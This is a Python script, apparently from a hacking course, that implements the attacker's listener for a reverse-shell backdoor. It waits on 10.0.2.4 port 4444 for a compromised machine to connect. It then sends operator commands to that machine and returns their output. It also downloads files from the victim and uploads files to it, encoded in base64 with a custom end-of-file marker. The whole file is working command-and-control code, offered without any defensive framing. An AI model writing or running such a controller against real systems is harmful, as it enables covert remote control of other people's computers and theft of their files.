#!/usr/bin/env python
# https://docs.python.org/2/library/socket.html
# https://www.tutorialspoint.com/python/python_networking.htm
import base64
import json
import os
import socket
import sys

import chardet


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                byte_data = self.connection.recv(1024)
                json_data = json_data + self.decode(byte_data)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        elif command[0] == "download" and len(command) > 1:
            return self.receive_file(command[1])
        elif command[0] == "upload" and len(command) > 1:
            return self.send_file(command[1])

        return self.reliable_receive()

    def receive_file(self, path):
        # if os.path.exists(path):
        #     return "[-] Such file exists"

        total_receive = 0
        file = open(path, "wb")
        while True:
            encoded = self.connection.recv(1024)
            byte_data = base64.b64decode(encoded)
            if not byte_data:
                print("[-] The End")
                break

            eof = b"pp-00-11-22-ff"
            if encoded == base64.b64encode(eof):
                print("[+] Got EOF flag. Finishing...")
                break
            if encoded.endswith(base64.b64encode(eof)):
                print("[+] Got EOF flag. Extracting end of the file...")
                file.write(byte_data)
                total_receive += len(byte_data)
                break
            file.write(byte_data)
            total_receive += len(byte_data)

        file.close()
        # print(self.read_file(path))
        return "[+] Download successful. File size " + str(total_receive) + " bytes"

    def send_file(self, path):
        file = self.read_file(path)
        print("[+] Sending file...")
        self.connection.sendall(file)

        eof = base64.b64encode(b"pp-00-11-22-ff")
        print("[+] Sending EOF flag...", eof)
        self.connection.send(eof)

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def run(self):
        while True:
            command = input(">> ")
            # command = raw_input(">> ") #  python 2
            command = command.split(" ")
            try:
                result = self.execute_remotely(command)
            except Exception:
                result = "[-] Error during command execution. Listener side."
            print(result)

    def decode(self, data):
        try:
            encoding = chardet.detect(data)['encoding']
            return data.decode(encoding)
        except (UnicodeDecodeError, AttributeError, TypeError):
            return data


my_listener = Listener("10.0.2.4", 4444)
my_listener.run()
